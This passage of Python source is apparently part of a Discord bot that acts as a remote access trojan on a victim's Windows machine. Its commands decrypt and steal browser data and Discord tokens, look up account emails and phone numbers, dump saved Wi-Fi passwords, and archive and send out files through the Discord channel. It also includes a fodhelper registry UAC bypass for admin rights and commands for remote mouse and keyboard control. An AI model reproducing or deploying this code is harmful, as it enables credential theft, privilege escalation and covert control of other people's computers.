                        datafile = open(info[data_type_name][0], "a", encoding="utf-8")
                        data = getbrowserdata(path, "Default", key, data_type)
                        if data is not None:
                            if len(data) > 0:
                                try:
                                    datafile.write(data)
                                except UnicodeEncodeError as e:
                                    print(e)
                        datafile.close()

                embed = discord.Embed(color=0x2B2D31)
                embed.set_thumbnail(
                    url=gifs['earth'])

                for e in info.keys():
                    if os.path.getsize(info[e][0]) > 0:
                        embed.add_field(
                            name="",
                            value=f'`╓` {info[e][1]}'
                                  f'\n`╟` `🔎 Found: ` `{open(info[e][0], "r", encoding="utf-8").read().count("╠")}`'
                                  f'\n`╙` [{info[e][0].split(bs)[-1]}]({getfileio(info[e][0])})',
                            inline=True,
                        )
                embed.set_footer(text=SHORTCLIENTINFO)
                await message.channel.send(embed=embed)

            if args[0] == "!grabdiscord":
                def decryptval(buff, master_key=None):
                    starts = buff.decode(encoding="utf8", errors="ignore")[:3]
                    if starts in ("v10", "v11"):
                        iv = buff[3:15]
                        payload = buff[15:]
                        cipher = AES.new(master_key, AES.MODE_GCM, iv)
                        decrypted_pass = cipher.decrypt(payload)
                        decrypted_pass = decrypted_pass[:-16].decode()
                        return decrypted_pass

                discordtokens = []

                def getbrowsertokens(path):
                    if not os.path.exists(path):
                        return

                    for file in os.listdir(path):
                        if file.endswith(".log") or file.endswith(".ldb"):
                            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if
                                         x.strip()]:
                                for regex in (
                                        r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}",
                                        r"mfa\.[\w-]{80,95}",
                                ):
                                    for token in re.findall(regex, line):
                                        if [path, token] not in discordtokens:
                                            discordtokens.append([path, token])

                def getdiscord(path, arg):
                    if not os.path.exists(f"{path}\\Local State"):
                        return

                    pathC = path + arg

                    pathKey = path + "\\Local State"
                    with open(pathKey, "r", encoding="utf-8") as f:
                        local_state = json.loads(f.read())
                    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    master_key = CryptUnprotectData(master_key[5:])
                    for file in os.listdir(pathC):
                        if file.endswith(".log") or file.endswith(".ldb"):
                            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if
                                         x.strip()]:
                                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                                    tokenDecoded = decryptval(base64.b64decode(token.split("dQw4w9WgXcQ:")[1]),
                                                              master_key)
                                    if [path, tokenDecoded] not in discordtokens:
                                        discordtokens.append([path, tokenDecoded])

                def gettokeninfo(token):
                    headers = {
                        "Authorization": token,
                        "Content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
                    }

                    userjson = json.loads(
                        urlopen(
                            Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
                    username = userjson["username"]
                    email = userjson["email"]
                    idd = userjson["id"]
                    pfp = userjson["avatar"]
                    flags = userjson["public_flags"]
                    nitro = ""
                    phone = "-"

                    if "premium_type" in userjson:
                        nitrot = userjson["premium_type"]
                        if nitrot == 1:
                            nitro = f"{emojis['nitro']}"
                        elif nitrot == 2:
                            nitro = f"{emojis['nitro']}"
                    if "phone" in userjson:
                        phone = userjson["phone"]

                    return username, email, idd, pfp, flags, nitro, phone

                for d in discordpaths:
                    getdiscord(d[0], d[1])
                for b in browserdiscordpaths:
                    getbrowsertokens(b[0])
                embedlist = []
                for t in discordtokens:
                    try:
                        accinfo = gettokeninfo(t[1])
                        embed = discord.Embed(color=0x2B2D31)
                        embed.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{accinfo[2]}/{accinfo[3]}.png")
                        embed.add_field(name=f"<a:Discord_animated_logo:1217194083362013305> Account Info",
                                        value=f"",
                                        inline=False)

                        embed.add_field(name=f"<a:folder:1217194860927385771> Token found in `{t[0]}`",
                                        value=f"```{t[1]}```", inline=False)

                        accinfoembedtypes = [f"• {emojis['user_icon']} `Username:` `{accinfo[0]}`",
                                             f"• {emojis['mail']} `Email:` `{accinfo[1]}`",
                                             f"• {emojis['icons_ping']} `User ID:` `{accinfo[2]}`"]

                        if len(accinfo[5]) > 3: accinfoembedtypes.append(
                            f"• {emojis['nitro']} `Nitro:` {accinfo[5]}")
                        if accinfo[6] is not None: accinfoembedtypes.append(f"• `☎` `Phone:` `{accinfo[6]}`")

                        for fieldtext in accinfoembedtypes: embed.add_field(name=f"", value=fieldtext, inline=True)
                        embedlist.append(embed)
                    except HTTPError:
                        pass
                for e in embedlist: await message.channel.send(embed=e)

            if args[0] == "!upload":
                if os.path.exists(args[1]) and len(message.attachments) > 0:
                    output = ""
                    await message.attachments[0].save(args[1] + r"\\" + message.attachments[0].filename)
                    output += f"┏ 📁 File {message.attachments[0].filename}\n"
                    for attachment in message.attachments[1:]:
                        filename = attachment.filename
                        print(filename)
                        savepath = args[1] + "\\" + filename
                        await attachment.save(savepath)
                        output += f"┣ 📁 File {filename}\n"
                    output += f"┗━▶ 📦 Saved to {args[1]}\n"
                    embed = discord.Embed(color=0x2B2D31, title="`📮 File upload succesful!`",
                                          description=f"```{output}```")
                    embed.set_thumbnail(
                        url=list(gifs.values())[random.randrange(0, len(list(gifs.values())))])
                    embed.set_footer(text=SHORTCLIENTINFO)
                    await message.channel.send(embed=embed)

            if args[0] == "!sendfile":
                for path in args[1:]:
                    await message.channel.send(embed=getfileembed(path))

            if args[0] == "!wifi":
                command_output = subprocess.run(["netsh", "wlan", "show", "profiles"],
                                                capture_output=True).stdout.decode()
                profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
                wifi_list = []
                if len(profile_names) != 0:
                    for name in profile_names:
                        wifi_profile = {}
                        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name],
                                                      capture_output=True).stdout.decode()
                        if re.search("Security key           : Absent", profile_info):
                            continue
                        else:
                            wifi_profile["Wifi"] = name
                            profile_info_pass = subprocess.run(
                                ["netsh", "wlan", "show", "profile", name, "key=clear"],
                                capture_output=True).stdout.decode()
                            password = re.search("Key Content            : (.*)\r", profile_info_pass)
                            if password is None:
                                wifi_profile["Password"] = None
                            else:
                                wifi_profile["Password"] = password[1]

                            wifi_list.append(wifi_profile)

                output = ""
                maxwifilen = max([len(wifi["Wifi"]) for wifi in wifi_list])
                maxpasslen = max([len(wifi["Password"]) for wifi in wifi_list])
                output += "WIFI NAME" + " " * (maxwifilen - len("WIFI NAME") + 1) + "┃ " + "PASSWORD\n"
                output += ("━" * maxwifilen + "━╋━" + "━" * maxpasslen + "\n")
                for x in wifi_list:
                    output += (x["Wifi"] + " " * (maxwifilen - len(x['Wifi']) + 1) + "┃ " + x["Password"]) + "\n"
                writetofile(output, TEMP + "\\wifi.txt")

                await message.channel.send(file=File(TEMP + "\\wifi.txt"))

            if args[0] == "!drives":
                def btogb(b):
                    KB = 1000
                    MB = KB * 1000
                    GB = MB * 1000
                    return str(b / GB) + " GB"

                a = ""
                for disk in psutil.disk_partitions():
                    total, used, free = 0, 0, 0
                    if disk.fstype:
                        total += int(psutil.disk_usage(disk.mountpoint).total)
                        used += int(psutil.disk_usage(disk.mountpoint).used)
                        free += int(psutil.disk_usage(disk.mountpoint).free)

                    a += f"```💿 {disk.device} {btogb(total)} TOTAL, {btogb(used)} USED, {btogb(free)} FREE```"
                embed = discord.Embed(color=0x2B2D31, title=f"`📋 Available logical drives:`")
                embed.add_field(
                    name="", value=f"{a}", inline=True
                )
                embed.set_footer(text=SHORTCLIENTINFO)
                await message.channel.send(embed=embed)

            if args[0] == "!geolocate":
                with urllib.request.urlopen("https://geolocation-db.com/json") as url:
                    data = json.loads(url.read().decode())
                    link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
                    embed = discord.Embed(color=0x2B2D31, title=f"`🌎` Location link",
                                          description=f"`Latitude` `{data['latitude']}`\n`Longitude:` `{data['longitude']}`")
                    embed.url = link
                    embed.set_footer(text=SHORTCLIENTINFO)
                    await message.channel.send(embed=embed)

            if args[0] == "!findallfiles":
                if len(args) < 3:
                    args.append(args[1])
                    args[1] = os.getcwd()

                def findallfiles(directory, keyword):
                    filepaths = []
                    for root, _, files in os.walk(directory):
                        for file in files:
                            if str(keyword).lower() in str(file).lower():
                                filepath = f"{os.path.join(root, file)} {bytestoreadable(os.path.getsize(os.path.join(root, file)))}"
                                filepaths.append(filepath)

                    return filepaths

                keywords = ""
                for keyword in args[2:]: keywords += f"{keyword} "
                stringfilepaths = ""
                filepaths = []
                for keyphrase in args[2:]:
                    filepaths.extend(findallfiles(args[1], keyphrase))
                for filepath in filepaths:
                    stringfilepaths += f"{filepath}\n"
                writetofile(stringfilepaths, f"{TEMP}/filelist.txt")
                embed = discord.Embed(color=0x2B2D31,
                                      description=f"`🔎 Found {len(filepaths)} files!` \n`🔑 Keywords:` `{keywords}` \n`📁 File paths:`")
                embed.set_footer(text=SHORTCLIENTINFO)
                await message.channel.send(embed=embed)
                await message.channel.send(file=File(f"{TEMP}/filelist.txt"))

            if args[0] == "!sendallfiles":
                if len(args) < 3:
                    args.append(args[1])
                    args[1] = os.getcwd()

                def findallfiles(directory, keyword):
                    filepaths = []
                    for root, _, files in os.walk(directory):
                        for file in files:
                            if str(keyword).lower() in str(file).lower():
                                filepath = f"{os.path.join(root, file)}"
                                filepaths.append(filepath)

                    return filepaths

                destination = mainfolder + f"\\files"
                zipfilepath = mainfolder + f"\\files.rar"
                if not os.path.exists(destination):
                    os.mkdir(destination)
                filepaths = []
                for keyphrase in args[2:]:
                    filepaths.extend(findallfiles(args[1], keyphrase))
                for filepath in filepaths:
                    shutil.copy2(filepath, destination)

                os.system(f"cd {mainfolder} & tar -cvf files.rar files")

                embed = discord.Embed(color=0x2B2D31,
                                      description=f"`🔎 Found {len(filepaths)} files!` \n`🔑 Keywords:` `{unsplit(args[2:])}` \n`📁 ZIP File:`")
                embed.set_thumbnail(
                    url="https://cdn.discordapp.com/emojis/1216135035233763529.gif?size=96&quality=lossless")
                embed.set_footer(text=SHORTCLIENTINFO)

                await message.channel.send(embed=embed)
                await message.channel.send(embed=getfileembed(zipfilepath))

                shutil.rmtree(destination)
                os.remove(zipfilepath)

            if args[0] == "!uacbypass":
                def isAdmin():
                    try:
                        is_admin = (os.getuid() == 0)
                    except AttributeError:
                        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                    return is_admin
                if isAdmin():
                    await message.channel.send("`👑 Your already admin!`")
                else:
                    class disable_fsr():
                        disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
                        revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
                        def __enter__(self):
                            self.old_value = ctypes.c_long()
                            self.success = self.disable(ctypes.byref(self.old_value))
                        def __exit__(self, type, value, traceback):
                            if self.success:
                                self.revert(self.old_value)
                    await message.channel.send("`❓ Trying to get admin...`")
                    pidfile = open(f"{TEMP}\\uac.txt", "w")
                    pidfile.write(str(processid))
                    pidfile.close()

                    if not sys.argv[0].endswith("exe"):
                        cmd2 = sys.argv[0]
                        create_reg_path = """ powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """
                        os.system(create_reg_path)
                        create_trigger_reg_key = """ powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """
                        os.system(create_trigger_reg_key)
                        create_payload_reg_key = """powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start python """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
                        os.system(create_payload_reg_key)
                    else:
                        cmd2 = sys.argv[0]
                        create_reg_path = """ powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """
                        os.system(create_reg_path)
                        create_trigger_reg_key = """ powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """
                        os.system(create_trigger_reg_key)
                        create_payload_reg_key = """powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
                        os.system(create_payload_reg_key)
                    with disable_fsr():
                        os.system("fodhelper.exe")
                    time.sleep(2)
                    remove_reg = """ powershell Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force """
                    os.system(remove_reg)

            if args[0] == "!mu":
                if len(args) != 1:
                    pyautogui.moveTo(pyautogui.position().x, pyautogui.position().y - int(args[1]) * 10)
                else:
                    pyautogui.moveTo(pyautogui.position().x, pyautogui.position().y - 10 * 10)
            if args[0] == "!md":
                if len(args) != 1:
                    pyautogui.moveTo(pyautogui.position().x, pyautogui.position().y + int(args[1]) * 10)
                else:
                    pyautogui.moveTo(pyautogui.position().x, pyautogui.position().y + 10 * 10)
            if args[0] == "!ml":
                if len(args) != 1:
                    pyautogui.moveTo(pyautogui.position().x - int(args[1]) * 10, pyautogui.position().y)
                else:
                    pyautogui.moveTo(pyautogui.position().x - 10 * 10, pyautogui.position().y)
            if args[0] == "!mr":
                if len(args) != 1:
                    pyautogui.moveTo(pyautogui.position().x + int(args[1]) * 10, pyautogui.position().y)
                else:
                    pyautogui.moveTo(pyautogui.position().x + 10 * 10, pyautogui.position().y)

            if args[0] == "!lmb":
                pyautogui.leftClick()
            if args[0] == "!rmb":
                pyautogui.rightClick()
            if args[0] == "!write":
                pyautogui.write(args[1])
            if args[0] == "!press":
                pyautogui.press(args[1])
            if args[0] == "!shortcut":
                shortcut(args[2], args[1])


bot.run("TOKEN")
